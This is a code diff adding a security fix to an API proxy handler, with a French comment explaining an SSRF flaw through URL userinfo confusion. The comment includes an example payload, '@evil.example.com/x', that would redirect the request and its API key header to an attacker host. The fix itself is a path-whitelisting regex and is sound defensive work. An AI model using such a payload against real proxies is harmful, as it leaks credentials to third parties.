@@ -210,6 +210,30 @@ export default async function handler(req, res) {
     const { apiPath } = req.query
     const fdPath = apiPath ?? '/'
 
+    // ⚠️ FIX SÉCURITÉ (audit demandé par l'utilisateur, 28/09) : SSRF via
+    // confusion userinfo d'URL. `fdPath` était concaténé tel quel juste après
+    // le hostname (`https://api.football-data.org${fdPath}...`), SANS AUCUNE
+    // validation — contrairement à `api/espn.js` (whitelist `ALLOWED_SLUGS`)
+    // et `api/apifootball.js` (regex sur `endpoint`), qui ont déjà cette
+    // protection. Preuve concrète (testé en sandbox, `node -e`) : une valeur
+    // `apiPath=@evil.example.com/x` donne l'URL finale
+    // `https://api.football-data.org@evil.example.com/x` — le parseur WHATWG
+    // URL (utilisé en interne par `fetch()`) interprète alors
+    // `api.football-data.org` comme des identifiants HTTP Basic-Auth et
+    // `evil.example.com` comme le VRAI hôte de connexion : la vraie clé API
+    // FD.org (header `X-Auth-Token`) partirait alors vers ce serveur
+    // attaquant plutôt que vers football-data.org. Endpoint public, protégé
+    // seulement par un rate-limit (30/min/IP) — insuffisant contre ça, un seul
+    // appel suffit à exfiltrer la clé. Corrigé : seuls les vrais chemins
+    // utilisés par l'app (`/api/football?apiPath=/v4/...`, voir
+    // `src/utils/fdFetch.js`) sont acceptés — chemin commençant par `/v4/`,
+    // caractères alphanumériques/`/`/`-`/`_` uniquement (aucun `@`, `.`, `:`,
+    // espace...), ce qui rend la confusion userinfo structurellement
+    // impossible quelle que soit la valeur fournie.
+    if (!/^\/v4\/[a-zA-Z0-9/_-]*$/.test(fdPath)) {
+      return res.status(400).json({ error: 'apiPath invalide' })
+    }
+
     const rawQs = (req.url ?? '').split('?')[1] ?? ''
     const qs = rawQs
       .split('&')
